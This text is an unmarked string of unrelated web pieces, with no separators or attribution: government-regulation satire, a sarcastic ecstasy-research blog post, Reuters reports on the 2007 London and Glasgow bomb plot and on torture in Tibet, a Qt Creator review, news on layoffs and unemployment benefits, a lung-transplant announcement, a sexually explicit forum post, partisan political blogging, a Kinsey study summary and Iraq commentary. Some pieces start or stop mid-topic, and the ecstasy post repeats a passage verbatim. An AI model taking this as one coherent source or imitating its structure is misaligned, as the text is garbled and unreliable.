He takes a nap every day in the late afternoon -- just as he wakes up every morning at five - thirty to read and study and write and pray for the legions who have requested his prayers ; just as he goes to bed at nine - thirty at night and sleeps eight hours without interruption .

" For those of you who may have forgotten , on November the 5th , 2006 in Cherokee county Georgia a horrific crime occurred .

DIGG THIS
I was talking with some friends over the Christmas holiday break and they were commenting on how lucky we are that we live in a free country where we have the liberty and the opportunity to live our lives the way we want and are not controlled by the government like in other countries .
So I started thinking about a particular day of mine a couple months ago :
I woke up in the morning in my FHA ( Federal Housing Administration ) approved home that was built in accordance with USDOE ( Department of Energy ) , FERC ( Federal Energy Regulatory Commission ) , and numerous CFRs ( Code of Federal Regulations ) .
I went to the bathroom to clean up for work .
I showered with soap , shampoo and other toiletry products that have been approved for me by the FDA ( Food and Drug Administration ) using water that meets federal EPA ( Environmental Protection Agency ) quality standards .
I took my morning vitamins which had to be approved by the FDA .
I went downstairs to eat breakfast foods that had to be approved by the FDA and listened to my morning radio programs which are regulated by the FCC ( Federal Communication Commission ) .
I then got into my EPA and DOT ( Dept. of Transportation ) standards approved and FTC ( Federal Trade Commission ) regulated car and was forced by the NHTSA ( National Highway Traffic Safety Administration ) to buckle my seatbelt and put my daughter into an approved child seat .
I then drove on DOT regulated roads and was forced to drive a certain speed while listening to more FCC approved programming on my radio .
I stopped for gas but there was n't any due to state legislated gas quality restrictions which caused a decrease in the supply of gas and also gasoline price controls that kept the price so artificially low that there was an excess demand such that it sold out as soon as it arrived .
I arrived at my DOL ( Dept. of Labor ) regulated and EEOC ( Equal Employment Opportunity Commission ) sanctioned place of employment , running on fumes , and was forced to work the first 2 hours of my 8 hour shift for the federal and state governments by giving almost 30 % of my wages to the IRS and SSA ( Social Security Administration ) with no compensation .
At lunchtime I went with colleagues to eat and was forced to pay with the only medium of exchange the government approves that is regulated by the FRB ( Federal Reserve Board ) : worthless fiat bank notes .
I then went to pick up my daughter from school where she 's learning a DOE ( Dept. of Education ) approved curriculum .
I took her to an HMO ( Health Maintenance Organization ) approved doctor to get her HHS ( Health and Human Services ) mandated vaccinations that I learned she needed while watching a Disney family movie which was interrupted by an HHS PSA .
After returning to work I checked my SEC ( Securities and Exchange Commission ) and IRS regulated investments in my now Federal Treasury owned banks to see if I 'll be able to retire someday since the SSA trust fund that I 've been paying into for 25 years has been raided by the federal government and is now bankrupt .
That afternoon I had to catch a flight to our office in Detroit aboard an FAA ( Federal Aviation Administration ) approved plane operating at an FAA regulated airport .
Before boarding I had to pass through a TSA ( Transportation Safety Administration ) security checkpoint where I was forced to disrobe down to my shirt , pants and socks and pass through a scanning machine that saw right through my remaining clothing .
Onboard I noticed federal sky marshals with weapons so I decided to have a cocktail composed of liquor that is controlled by the ATF ( Alcohol Tobacco and Firearms ) , as are the sky marshal 's guns .
Once sufficiently sedated with bourbon , I sat back and relaxed and thought to myself : Thank God I do n't live in a country where the government controls your life !

Ecstasy research gets $ 1.7 million grant Hmm , this sounds promising : The National Council on Drug Abuse awarded The University of Arizona College of Pharmacy $ 1.7 million for a nearly five - year study of the long - term adverse effects of the street drug ecstasy .
Terrence J. Monks , head of the UA 's department of pharmacology and toxicology , is a specialist in the study of drug toxicology , or the " bad " effects of drugs .
He will be the principal investigator on the newly funded project .
" Most research on ecstasy focuses on the pharmacological , or nontoxic effects of the drug , " said Monks .
" My interest lies in learning how the drug negatively affects the brain . "
I rely on the more educated members of our audience to clue me in as to how " most research " into this substance has focused on " nontoxic effects " of Ecstasy given that researchers seem to be literally stumbling over each other to announce so - called negative effects from the drug .
But thank goodness someone is willing to spend over a million dollars looking into this ; after all , as Terrence Monks notes : I rely on the more educated members of our audience to clue me in as to how " most research " into this substance has focused on " nontoxic effects " of Ecstasy given that researchers seem to be literally stumbling over each other to announce so - called negative effects from the drug .
But thank goodness someone is willing to spend over a million dollars looking into this ; after all , as Terrence Monks notes : " A number of adverse effects are associated with the use of MDMA , " Monks added .
" MDMA use and abuse therefore has the potential to give rise to a major public health problem . "
Ahhhh ... let 's see , after approximately , um , thirty years or so in which MDMA use has been relatively prevalent , it just might possibly have the " potential " to create a " major public health problem " and it's only the valiant , altruistic efforts of the likes of Terrence Monk ( as funded by the National Council on Drug Abuse ) that could prevent some horrible epidemic .
Because , as is apparently obvious to the grantors at the National Council on Drug Abuse , hospital wards and psychiatric departments are crammed to the gills with the early waves of shell - shocked MDMA victims who could have benefited from Terrence Monk 's brave and politically risky research .

Meanwhile , here 's a completely unrelated tidbit of interest : apparently , in the UK at least , if you think you 're snorting cocaine , you might actually be snorting Ecstasy !
Oh noze !

Oh noze !
Hospitals are facing an influx of drug users who have overdosed on MDMA -- the main ingredient of ecstasy -- because they thought they were snorting cocaine .
Professor David Nutt , incoming chairman of the Government 's Advisory Council on the Misuse of Drugs , said drug users were buying white powder but did not know what it was .
" If you are buying white powders from someone , how do you know if you are getting MDMA , methamphetamine or cocaine ?
It 's potentially very dangerous , " he said .
You see , this is the real issue that needs research : what is the appropriate amount of street Ecstasy that can actually be snorted without causing a hospital visit ?
I like how Professor Nutt 's equivocation - " It 's potentially very dangerous " - means that there 's inherently an amount of at least one of these white powders that is n't actually dangerous .
Whee , let 's boogie !

LONDON ( Reuters ) -
An Iraqi doctor was convicted on Tuesday of a plot to commit “ wholesale ” murder by carrying out bomb attacks last year outside a nightclub in central London and at a packed Scottish airport a day later .
Bilal Abdulla is seen in this undated handout photo .
REUTERS / Handout / Files
Bilal Abdulla , 29 , was part of a small Islamist cell that planned a series of spectacular bombings but turned to a dramatic suicide ram- raid attack on Glasgow Airport when their initial plans failed .
Abdulla , along with accomplice Kafeel Ahmed , had wanted to punish the British people for their country ’s perceived persecution of Palestinian Muslims and those in Afghanistan and Iraq , Woolwich Crown Court was told .
Prosecutor Jonathan Laidlaw said the men wanted to commit murder on an “ indiscriminate and wholesale scale . ”
Their plans only failed because of a mixture of good fortune and technical mistakes which meant the devices did n’t explode .
Abdulla was found guilty of conspiracy to murder and conspiracy to cause explosions .
His co-accused Jordanian doctor Mohammed Asha , 28 , who was accused of providing guidance and funding for the attacks , was cleared of the same charges .
Abdulla will be sentenced at a later stage .
Ahmed , an Indian engineer , died of wounds sustained in the attack on Glasgow airport and was not on trial .
In the London attacks , two Mercedes cars packed with gas canisters , fuel containers and nails were driven down from Scotland and left in the busy West End area of the capital in the early hours of June 29 , 2007 .
One was parked outside Tiger Tiger , a nightclub packed with more than 550 revellers near Piccadilly Circus , while the second was left nearby close to a night bus stop .
Prosecutors and police have suggested the second car was deliberately placed to catch those fleeing from the first explosion .
However , despite repeated attempts to set off the mobile phone detonators in the cars , neither vehicle exploded .
The would - be bombers Abdulla and Ahmed escaped the scene in rickshaws and , having failed , the gang dramatically changed their plans , aware that the police and security services would be on their trail through clues left in the cars .
The next day , the bombers drove to Scotland with police hot on their heels .
Although police sources say detectives were “ just a road away ” from them as they prepared a new attack .
A Jeep Cherokee , also packed with fuel containers and gas canisters , was driven at speed into the international terminal at Glasgow Airport on what was its busiest day of the year .
Video footage showed how the flaming Jeep became stuck in the terminal doors and despite attempts to detonate it using petrol bombs , the vehicle failed to explode .

Kafeel Ahmed , 28 , the driver of the Jeep and also the bombmaker according to police , died from burns he sustained , while Abdulla , who was in the passenger seat , survived .
Abdulla denied plotting to kill anyone and told the court he “ loved England ” and thought they were going to Glasgow to flee the country .
The Iraqi , who worked as a junior doctor at the Royal Alexandra Hospital , Paisley , west of Glasgow , said the attacks were a stunt to bring attention to Britain ’s role in Iraq .
However , he admitted he hated the U.S. government and supported insurgents fighting in his homeland .
Prosecutors said their aim had been to cause fear on a scale generated by the July 7 , 2005 London bombings , the capital ’s worst peacetime attacks by militants , which killed 52 people .
Nokia has released an early technical preview of Qt Creator , a new open source integrated development environment that is cross-platform compatible and designed to accelerate Qt application development .
The IDE has built - in debugging tools and is tightly integrated with the Qt Designer user interface layout tool .
I 've spent a few days testing it to see how it compares to other development solutions .
It has a nice user interface and it offers a decent assortment of useful features .
I typically prefer to use Vim for coding , so I tend to dislike the structure and overhead of most IDE tools .
Qt Creator is relatively lightweight and does n't feel as fat or confining as some alternatives .
The autocompletion and new project wizard will be useful for new Qt developers .
The environment will make it easier for them to bootstrap projects and get started on development without having to figure out how all the pieces fit together .
The 200 MB Windows installer bundles MinGW and the Qt libraries , so it can be used by itself to supply a complete Qt developer environment .
Linux packages are available for 32 - bit and 64 - bit systems and are 22MB and 27MB respectively .
The Mac OS X build requires the user to have already installed the Qt binary package .
My favorite feature is the integrated QuickOpen search tool , which feels a little bit like Deskbar and can be used to find and quickly jump to a line in the current document , a specific class or method , or any file .
Another feature that I really like is the split view for contextual API help .
It will open a pane with documentation for whatever happens to be under the cursor .
For a more detailed overview of the features in Qt Creator , check out this blog entry by Eike Ziller , one of the Nokia developers who helped make the IDE .

NEW YORK ( CNNMoney.com ) --
Jobs took another painful hit in November , with planned cuts rising to the highest level in seven years , according to a report released Wednesday by an outplacement firm .
Job cut announcements by U.S. employers soared to 181,671 last month , up 61 % from October 's 112,884 cuts , and 148 % higher than the same period a year ago , when 73,140 job cuts were announced , according to the report by Challenger , Gray & Christmas .
November 's total represents the second highest on record , shy of the 248,475 planned layoffs in January 2002 , in the aftermath of the Sept. 11 terrorist attacks .
Financial and retail industries were hit the hardest , Challenger said .
Citigroup 's plans to cut its staff levels by more than 50,000 brought the financial sector 's announced job cuts to 91,356 last month .
The financial industry has announced 220,506 job cuts so far in 2008 , representing 21 % of all layoffs this year .
Retailers added another 11,000 cuts in November , ahead of the holiday season .
Of the 25 industry categories that the Challenger report tracks , 12 reported higher job cuts in November compared to the previous month .
Nine industries announced hiring plans , led by energy , industrial goods and construction .
Challenger said November 's numbers bring the total of planned job cuts to 1,057,645 for 2008 to date , surpassing 1 million for the first time since 2005 .
Separately , payroll manager ADP said Wednesday that the private sector lost a seasonally adjusted 250,000 jobs last month - worse than expected and the largest decrease since November 2002 .
The reports set the tone for another dismal employment report expected from the Department of Labor on Friday .
That report is expected to show that 325,000 jobs were lost in November , and that the unemployment rate grew to 6.8 % from 6.5 % a month earlier , according to a consensus of economists surveyed by Briefing.com .
The outlook for the current month is n't any brighter .
" The spirit of the holidays will not preclude further job - cutting if economic conditions continue to deteriorate , " said John Challenger , CEO of Challenger , Gray & Christmas .
" In fact , December has historically been among the larger job - cut months of the year , with many employers making last - minute staffing adjustments to meet year - end earnings goals . "
NEW YORK ( CNNMoney.com ) -- President Bush signed The Unemployment Extension
Act of 2008 into law Friday , lengthening the period of government assistance to Americans struggling in the shrinking job market .
The measure helps people whose benefits have recently expired , extending benefits by seven weeks in all states , and extending them for another 13 weeks on top of that in states with unemployment rates that have averaged 6 % or higher over the most recent three months .
( See state unemployment rates . )
So those who live in a high unemployment states will receive a total of 20 more weeks and nearly half of the states fit that criteria as of October , according to the Bureau of Labor Statistics .
Workers typically get 26 weeks of unemployment benefits , and it's not uncommon for the government to extend that during economic slowdowns .
Worried about how to make ends meet without a paycheck ?
Here 's what you should know to take advantage of the new law .
How you qualify :
To be eligible , you must be unemployed through no fault of your own and be actively seeking work .
Requirements vary from state to state .
Generally , wages earned and time on the job determine if you qualify and the level of assistance you will receive .
For example ,
In Washington you need to have 680 hours of employment in your base year - which is the first 12 of the last 18 months of work .
In Nevada , a person must have earned at least $ 400 in one quarter of the base year to get help .
What you get : States have their own formulas for determining how much you will receive and for how long , but a general rule of thumb is that you will get half of your last paycheck for 26 weeks , explained Andy Stettner , deputy director of the National Employment Law Project .
In most states that is based on what you earned over your base year - up to a certain amount .
Every state sets its own maximum , based on that state 's average income .
The average unemployment insurance benefit is $ 292 a week according to the Department of Labor .
When you get it : Experts recommend filing for unemployment on your first day out of work .
It generally takes two or three weeks after you file a claim to receive your first check .
In most cases there is then a " waiting week , " and then you will receive your first unemployment insurance check the week after that .
What impacts your benefits :
If you work part - time or freelance while you are collecting unemployment that will most likely reduce or eliminate your benefits .
The same is true for severance checks in some states .
You could still get a partial unemployment check but the formula for determining what percentage of your benefit you could still receive differs by state .
How to get in on the extension :
In most states your unemployment insurance will be automatically extended if the Unemployment Compensation Extension Act passes .
But to be sure , Stettner recommends calling your unemployment office to ask what you need to do to qualify .
To find out more about unemployment insurance benefits on a state - by - state basis , go to the State Unemployment Insurance agency .
For the first time in the world , transplant surgeons at Toronto General Hospital , University Health Network used a new technique to repair an injured donor lung that was unsuitable for transplant , and then successfully transplanted it into a patient .
The use of this technique could significantly expand the lung donor organ pool and improve outcomes after transplantation .
In their ground - breaking research , a team of lung transplant surgeons led by Dr. Shaf Keshavjee in the Lung Transplant Program at Toronto General Hospital ( TGH ) developed an " ex vivo " or outside the body technique capable of continuously perfusing or pumping a bloodless solution containing oxygen , proteins and nutrients into injured donor lungs .
This technique , the Toronto XVIVO Lung Perfusion System , allows the surgeons the opportunity to assess and treat injured donor lungs , while they are outside the body , to make them suitable for transplantation .
Unlike current cooling lung preservation techniques which inhibit cell metabolism and the possibility of any active repair processes prior to transplantation , the Toronto technique maintains donor lungs at a normal body temperature of 37 degrees Celsius , allowing for future organ repair and gene and cell therapy strategies to be used on them .
Although lung perfusion systems have been used in Sweden and England , these systems were blood - based , short - term assessment strategies which were not capable of long - term maintenance or techniques to repair or recondition the lungs .
The Toronto System was used on donor lungs for Andy Dykstra , 56 , who received his transplant on December 5 , 2008 .
He had been waiting for a transplant since July 30 , 2008 , and was told of the clinical trial testing the new system on December 4 , 2008 .
Recalling his difficulty breathing when walking to the front door in his home , Andy said that he waited only two seconds before deciding to be the first patient to receive the reconditioned lungs , which would not have been suitable for transplant without undergoing perfusion by the Toronto System .
" When I was given this chance , the hair on my arms stood up , I was so excited .
I knew it was right .
I just had to go for it , " he said , with his wife Chris standing by his side and nodding for emphasis .
Andy is part of an ongoing clinical trial which uses the novel Toronto strategy to identify donor lungs which do not meet current transplant criteria , repair them , and then transplant them into patients .
To date , four patients in total have received lungs treated using this technique , and all have done well .
But Andy was the first patient who received lungs which did not meet standard transplant criteria and which could not have been used if they had not been repaired first by the Toronto System .
( The three others received donor lungs which met transplant criteria and which were further improved by the Toronto System . )
All TGH patients waiting for a lung transplant are eligible to be part of this clinical trial , and the lung transplant team will assess all those who are interested .
" We are extremely pleased that Andy is doing so well , " said Dr. Keshavjee who is Director of the Lung Transplant Program at TGH , Senior Scientist , The McEwen Centre for Regenerative Medicine , Director , Latner Thoracic Research Laboratories , and Professor and Chair , Division of Thoracic Surgery , University of Toronto , adding that Andy was able to breathe without any mechanical assistance just four days after the transplant and was discharged from hospital 12 days after the procedure .
" This achievement was the result of years of research and pre-clinical planning by a large team of researchers , surgeons , physicians , nurses and other specialists .
It means that many more donor lungs which we could not have used before can now potentially be used safely , and it sets the stage for more sophisticated molecular and cellular repair techniques to be applied in the Toronto XVIVO Perfusion System so that transplant outcomes can be further improved .
The potential exists to immunologically pre-prepare the organ before it even sees the recipient 's immune system . "
He explained that currently only about 15 % - 20 % of donor lungs are acceptable for transplantation since lungs are susceptible to injuries during the brain - death process or from intensive care unit - related lung complications .
These numbers can easily be doubled with this technique to treat and improve donor lungs .
Dr. Marcelo Cypel , a transplant surgical fellow at TGH , echoed Dr. Keshavjee 's sentiments .
" This new technique heralds the beginning of a new era in transplantation since it has allowed us to progress from preserving donor lungs to actually being able to repair some of the injury before transplantation .
And we have done this using a unique strategy on donor lungs outside the body . "
After the donor lungs are removed from a deceased donor and taken to the hospital , they are carefully transferred to a protective , transparent bubble - like chamber that the Toronto team developed in collaboration with Vitrolife , a company specializing in developing lung preservation solutions
To avoid injuring the lungs , a series of precise steps are followed when connecting them to a circuit composed of a pump , ventilator and filters through which flow oxygen , nutrients and a special solution .
The temperature is incrementally increased until it reaches 37 degrees Celsius over about 30 minutes , and ventilation of the lungs is begun during that time .
Lung function is evaluated regularly on key indicators , such as how easily the lungs can exchange oxygen , airway pressure and lung compliance .
Previously published research by Drs. Keshavjee and Cypel on this system ( December 2008 issue of the Journal of Heart and Lung Transplantation ) has shown that lungs can be safely kept on this circuit for 12 hours in order to assess , maintain and treat them before successfully transplanting them .
Currently , about 80 patients are waiting for either a lung or heart - lung transplant in Ontario .
About 20 % of those on the wait list will die before they receive a lung transplant .
In Canada , the number of people waiting for a lung transplant has doubled in the past 10 years , with 252 Canadians waiting to receive a lung transplant in 2006 , compared to 119 in 1997 .
Two hundred and ninety - nine ( 299 ) Canadians died while waiting for a lung transplant between 1997 and 2006 .
The clinical trial is funded by Vitrolife Inc. and is approved by the Research Ethics Board of University Health Network .
BEIJING ( Reuters ) -
The use of torture in the restless Chinese region of Tibet is widespread and routine and officials regularly ignore legal safeguards supposed to be in place to prevent it , a new report said on Wednesday .
Even when detainees are released , they may die of their injuries , be scarred for life mentally or physically and not be able to afford medical treatment or be denied it completely , the Free Tibet group said .
“ Despite claims by the Chinese government that there are ‘ extremely few cases of torture ’ , the evidence tells a different story , ” Free Tibet director Stephanie Brigden said .
“ There is no doubt that the Chinese government is permitting the use of torture as a weapon to suppress the Tibetan people . ”
China ’s Foreign Ministry did not immediately respond to a request for comment and calls to the spokesman ’s office of the Chinese - run Tibetan government in Lhasa went unanswered .
Chinese troops marched into Tibet in 1950 and the region ’s spiritual leader the Dalai Lama fled into exile in 1959 after a failed uprising against Beijing ’s rule .
Mountainous and remote Tibet was rocked by anti-Chinese protests earlier this year , which China blamed on the Dalai Lama , whom it brands a separatist .
He has repeatedly denied the claims .
Free Tibet said it had profiled numerous cases of torture carried out against people detained following the demonstrations , which spilled over into other ethnically Tibetan parts of China such as Gansu , Qinghai and Sichuan provinces .
It said that one monk at the Labrang monastery in Gansu , Jigme Gyatso , had to be hospitalised for almost a month after his injuries received in detention .
“ They would hang me up for several hours with my hands tied to a rope ... hanging from the ceiling and my feet above the ground .
Then they would beat me on my face , chest , and back , with the full force of their fists , ” he said in the report .
“ Finally , on one occasion , I lost consciousness and was taken to hospital .
After I regained consciousness at the hospital , I was once again taken back to prison where they continued the practice of hanging me from the ceiling and beating me . ”
LITTLE PROGRESS
China has vowed to stamp out torture in its judicial system , described as widespread by some critics , in the face of international and domestic pressure .
Last month , the U.N. Committee Against Torture , in a rare public review of China ’s record , expressed dissatisfaction with a “ very serious information gap ” about abuses in the country where criminal justice information is often considered a state secret .
Free Tibet , in the report issued to coincide with International Human Rights Day , said Chinese laws aimed at protecting detainees were regularly ignored in Tibet .
“ The international community can no longer hide behind sound bites condemning China ’s human rights track record in Tibet and must now take specific actions to reverse the worsening crisis in Tibet , ” Brigden added .
China and envoys of the Dalai Lama have been meeting on and off for the past few years , but with little to show for their talks .
Beijing has rejected the Dalai Lama ’s calls for greater autonomy as being part of a plot for covert independence .
On Wednesday , the semi-official China News Service quoted Si Ta , a deputy head of the United Front Work Department which handles relations with non-Communists and ethnic and religious minorities , as repeating that the door to talks was always open .
“ The Party still has expectations of the Dalai Lama and plenty of patience , but ‘ Tibet independence ’ , ‘ half independence ’ or ‘ covert independence ’ are unacceptable , ” it paraphrased him as saying in Washington .
WASHINGTON -- Democrats strengthened their majorities in both houses of Congress and moved close to a level of domination in the Senate that could enable them to push through major legislation .
Combined with Sen. Barack Obama 's victory in the presidential race , the congressional results gave Democrats broad power in Washington that they have n't enjoyed in decades .

There 's a lot of debate over health / hygiene benefits of circumcision .
Of all that I 've read , it seems that there is no measurable benefit for the procedure .
So I 'm just gonna stick to subjective ratings .......
Foreskin is better for sex & handjobs ( easier & more fun to play with ) .
Sex with some cut penises can chaff , especially if u are a little dry !
OUCH !
The extra skin also acts like a ribbed condom , more ridges to feel .
Some chicks say they can't tell the difference btwn cut & uncut for sex , but I can .
Some guys may have a thin foreskin , so that may explain it .
My BF has a thick one , so it definitely FEELS nicer than other cut guys I 've had .
With a condom , it 's less noticeable .
Now , for oral , circumcised is the winner .
Foreskins feel kinda weird & mushy in the mouth & they have a stronger smell .
Unless the guy has JUST stepped out of the shower , I can always detect that " smegma-ish " scent .
Not too say that it 's horrible or anything , ' coz women 's privates smell even stronger .
But I HAVE been with both varieties who had less than perfect hygiene & I can tell u ........ I almost got turned - off foreskin for LIFE .
The cut guy still smelled bad , but nowhere NEAR the uncut one !
So all u turtle - necked hunks out there ....... PLEASE take care of your lil' pets !

Cynthia Tucker of the Atlanta Journal - Constitution slams the anti-democracy forces of evil that have become the GOP's ( almost ) last hope ...
The base of the Republican Party — a dwindling but still significant group — clings to a handful of pseudo - facts that do n’t hold up to serious scrutiny but that still occupy a central place in GOP ideology .
Those include the assertion that Saddam Hussein represented a threat to the United States , that affirmative action in lending led to the mortgage crisis and that voter fraud is a serious problem in modern elections .
In campaign seasons such as this , when victory may turn on a handful of votes , none of those claims is more important to Republican activists than overhyped allegations of voter fraud .
She goes on to note the insidious and shameless GOP New Mexico operative , Patrick Rogers ( yes , of the voter - suppresion front group " American Center for Voting Rights " and , yes , at the heart of the U.S. Attorney Purge in the state and , yes , a man willing to lie to fend off charges of vote - buying by his comrade , the disgraced , outgoing Rep. Heather Wilson ) , who was discovered in " a recently unearthed e- mail " to have spoken quite directly to the cynical and despicable issue of using phony claims of " voter fraud " to help keep bad voters ( Dems ) away from the polls , and encourage good voters ( Repubs ) to turn out if only to counter all those dirty , filthy , illegal aliens who are showing up ( after giving their names and addresses to the federales , in order to register , presumably ) to vote ...
A recently unearthed e-mail from a Republican strategist in New Mexico shows the unbridled cynicism that underlies claims about fraudulent voting .
Patrick Rogers , former lawyer for the New Mexico Republican Party , was among the party hacks pushing for criminal investigations into alleged voter fraud .
He clearly was hoping that the threat of legal sanctions would intimidate Democrats and aid Republicans , including U.S. Rep.
Heather Wilson ( R - N.M. ) , who was in a tight race for re-election .
According to a new report from the U.S. Justice Department ’s inspector general , Rogers wrote in September 2004 : “ I believe the [ voter ]
ID issue should be used at all levels — federal , state legislative races and Heather ’s race . …
You are not going to find a better wedge issue . …
This is the single best wedge issue , ever in [ New Mexico ] . ”
Tucker 's optimistic conclusion --- the " tactic seems unlikely to be enough to prevent Democrats from gaining seats in Congress , if not the White House .
Democrats are registering in record numbers , and the GOP ca n’t intimidate or eliminate enough of them to make a difference " --- is a bit premature for our tastes .
Still , Tucker clearly gets it , and it's good to see somone in the corporate mainstream speaking so directly about the despicable foes of American democracy , who --- we 've come to learn after watching the History Channel 's " Ku Klux Klan : A Secret History " late - night over the weekend , comes directly out of precisely the same hateful playbook .
Tucker closes ...
The GOP ’s brand is in tatters , dragged down by an incompetent president , an unpopular war and a sickly economy .
So the party seems to be pinning its hopes on keeping likely Democrats — people of color , the poor , college students — away from the polls .
...
The stench of corruption and cynicism emanating from the effort to disenfranchise voters is finally too heavy to ignore .
The GOP is just ensuring that the tarnish on its brand becomes permanent .
We 'd expect no less from a party who is still proud to publicly revere , rather than revile , men such as this one .

BLOOMINGTON , Ind. --
Scientists have long known that women 's preferences for masculine men change throughout their menstrual cycles .
A new study from Indiana University 's Kinsey Institute is the first to demonstrate differences in brain activity as women considered masculinized and feminized male faces and whether the person was a potential sexual partner .
The researchers identified regions of the brain that responded more strongly to masculine faces and demonstrated that differences between masculinized and feminized faces appeared strongest when the women were closer to ovulating .
The study , published in an online edition of the journal " Evolution and Human Behavior , " sheds light on the link between women 's hormone levels and their brain responses to masculinized versus feminized male faces , potentially offering insights into female mate preferences .
The current study points towards enhancements of both sensory discrimination and risk processing around ovulation in response to masculine faces as possible mediators of women 's mate preferences .
" One area of the brain in which we observed a difference in activation in response to masculinized versus feminized faces -- specifically during the follicular phase -- was the anterior cingulate cortex , which is a region involved in decision - making and the evaluation of potential reward and risk , " said neuroscientist Heather Rupp , research fellow at the Kinsey Institute for Research in Sex , Gender and Reproduction at Indiana University .
" Activation in this region has been previously reported to correlate with ' high risk ' nonsocial choices , specifically monetary risk , so it is interesting that it is observed to be more active in response to masculinized male faces , who may be both riskier but more rewarding to women . "
Previous studies have shown that women 's sexual preference for facial characteristics vary depending on their menstrual phase .
These fluctuating preferences are thought to reflect evolutionarily founded changes in women 's reproductive priorities .
Around the time of ovulation women prefer more masculinized faces -- faces with features that indicate high levels of testosterone .
These facial cues predict high genetic quality in the male because only such males can afford the immune - compromising effects of testosterone .
Testosterone may be costly for the males ' mates as well because high testosterone levels also are associated with high rates of offspring abandonment .
Around the time of ovulation , a female 's preference apparently shifts from avoiding negligent parenting to acquiring the best genes for her offspring .
At other points during the cycle , women will prefer more feminized male faces , as they might signal a higher willingness of the males to invest in offspring .
Rupp and her team set out to explore the link between hormone levels and brain responses to masculinized versus feminized male faces .
Pictures of 56 male faces were masculinized and feminized using standard computer - morphing software .
Twelve heterosexual women , averaging about 25 years old , were tested during the follicular phase , which is closer to ovulation and higher fertility time , and the luteal phases of their menstrual cycles .
Before each test session their blood was collected for hormone analyses .
While brain activity was measured using functional Magnetic Resonance Imaging , women viewed the masculinized and feminized male faces , indicating their interest in the man depicted as a potential sexual partner .
Researchers found differences in brain regions related to face perception , decision making and reward processing that responded more strongly to masculinized than feminized faces , suggesting that " neural activation in response to face stimuli is sensitive to facial masculinization , even in the absence of differences in subjective ratings . "
Differences between masculinized and feminized faces appeared strongest during the follicular phase , closer to ovulation .

McClatchy has published an English translation of the draft security agreement between the Iraqi government and the Bush administration .
Leila Fadel of McClatchy ’s reads the agreement as calling for all US troops to be out of Iraq by the end of 2011 :
‘ If Iraq ’s parliament endorses the agreement , in six weeks American forces would have to change the way they operate in Iraq , and all U.S. combat troops , police trainers and military advisers would have to leave the country by Dec. 31 , 2011 .
President - elect Barack Obama ’s campaign plan to leave a residual force of some 30,000 American troops in Iraq would be impossible under the pact .
Unless the agreement is amended , which would require the formal written approval of both sides , in three years there no longer would be any legal basis for U.S. armed forces or civilian contractors of the Department of Defense to remain in Iraq .
If Iraq wants American forces to leave earlier , it could terminate the agreement with one year ’s notice .
The United States has the option to do the same . ‘
Also , of course , the agreement can be immediately altered if both sides mutually agree to do so .
PM Nuri al - Maliki went on Iraqi t.v. to push for passage of the security agreement .
The problem with t.v. in Iraq is that the electricity is off so much of the day that a lot of people cannot see any particular such program .
Al - Hayat reports in Arabic that controversy rages in raging in Baghdad over the security agreement with Washington that was passed by the Iraqi cabinet on Sunday .
The Kurdistan Alliance , the Islamic Supreme Council of Iraq ( ISCI ) , and the Islamic Da’wa ( Missionary )
Party were all attempting to line up the votes in parliament to pass it .
In contrast , the Sadr Movement was seeking to put together a coalition of parties to oppose the agreement and stop it from being passed by parliament .
The Iraqiya Party of Iyad Allawi has announced that it has severe reservations about the agreement , and would prefer that Iraq go back to the UN Security Council for an extension of its mandate to the multinational forces rather than signing a bilateral treaty with the US .
The Sunni fundamentalist Iraqi Accord Front also announced that it had reservations about the agreement on Tuesday .
Adnan Dulaimi demanded that the remaining thousands of Iraqi Sunnis in US custody be released as part of the price for IAF support of the measure .
The Sadrists have 30 seats in parliament , the Iraqiya has 25 , and the Iraqi Accord Front has 44 , for a total of 99 .
They need 138 of 275 ( though since not all the MPs are likely to show up , they need 51 percent of the quorum of MPs that does attend the session ) .
It is not clear to me where the Iraqi Dialogue Front , with 11 seats , stands ( ex - Baathist secular Sunnis ) .
If they reject the agreement , that would bring the opposition to 110 .
They would need to pick up 28 Shiite independents in order to block the agreement .
But if ISCI and Da’wa strongly support the agreement , these two powerful parties may well be able to sway the independent Shiites to vote for it ..
Al - Hayat reports in Arabic that Grand Ayatollah Ali Sistani ’s office announced that he is studying the text and will only grant his approval once he is satisfied that it preserves national sovereignty and that a national consensus forms around it .
He charged the Iraqi parliament with investigating whether it met those two conditions .
The text of the announcement said , “ Sistani informed various political leaders in past days and weeks of the necessity that any agreement must aim at ending the foreign presence in Iraq and removing the country from Chapter 7 of the United Nations Charter , on two bases .
The first is that it must preserve the highest interests of the Iraqi people , past and future , recover for Iraq its complete sovereignty , and bring security and stability .
The second is that there must be a national consensus about it .
Without these two , no such agreement can be acceptable . ”
Meanwhile , the speaker of the Iranian parliament , Ali Larijani , came out against the agreement .
( The rest of the Iraqi establishment seems happy with the 2011 deadline for withdrawal of all US troops .
Larijani will probably run for president next spring - summer , and he may be adopting a hard line stance on this issue in hopes of gaining propularity with the Iranian voters .
Al - Hayat also says that in advance of the provincial elections in Iraq now scheduled for 31 January , a conflict has broken out among Shiite parties in the south .
The struggle was provoked by the High Electoral Commission , which granted the request of MP Abd al - Latif al - Wa’ili ( Independent , supported by Fadhila or Islamic Virtue Party ) that a referendum be held on whether Basra should be transformed into an autonomous Federal Region .
This move is opposed by the Islamic Supreme Council of Iraq , led by Abdul Aziz al - Hakim , who wants all 9 of the southern provinces to become a Federal Region or confederacy .
The Da’wa ( Islamic Mission ) Party of Prime Minister Nuri al - Maliki is genrally opposed to the creation of any new Federal Regions that would detract from the authority of the central government .
Al - Maliki is currently embroiled in a struggle with the Kurds insofar as he is attempting to reduce the prerogatives of the Kurdistan Regional Government .
The fourth major Shiite group , the Sadrists led by Sayyid Muqtada al - Sadr , rejects all federal regions , insisting on the primacy of the central government .
They sent a letter to the Arab League detailing the points in the agreement that they believed to be unlawful .
In the Iraqi constitution , federal regions are provincial confederacies that enjoy semi-autonomy and have complete ownership of any new natural resource finds ( including oil and gas ) .
Another plan against which the Basra scheme is competing envisions a union of Basra , Nasiriyah and Amara , for which a campaign has been launched to gather signatures from at least 2 percent of the voters in those three provinces .
In other news , a recently retired senior law lord in the UK has blasted the Iraq War as a serious violation of international law .

Last month , a thread on the twisted - web mailing list got me thinking about a frequently implemented , but seldom understood usage of Twisted : writing applications backed by a traditional database server .
I tried to write a timely reply on the mailing list , but found what I had to say on the topic was overflowing the polite bounds of an email message .
I 've tried to write about this before , buried in the middle of a post about something else .
I do n't think I really got my message across , though , because I believe this was quoted as saying that I find asynchronous data - access APIs " extremely painful " .
Asynchronousness is not the point that I find difficult , as much as I do transactionality ( and integration with existing database bindings ) .
So this time , please bear with me as I explain enough context to properly frame my opinion .
